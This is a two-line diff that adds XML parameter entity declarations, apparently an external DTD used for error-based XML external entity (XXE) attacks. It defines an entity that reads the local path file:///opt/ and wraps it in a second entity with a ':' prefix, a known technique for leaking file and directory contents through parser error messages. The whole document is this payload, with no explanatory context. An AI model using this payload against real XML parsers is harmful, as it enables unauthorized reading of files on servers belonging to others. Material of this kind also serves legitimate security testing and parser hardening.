@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "file:///opt/">
+<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
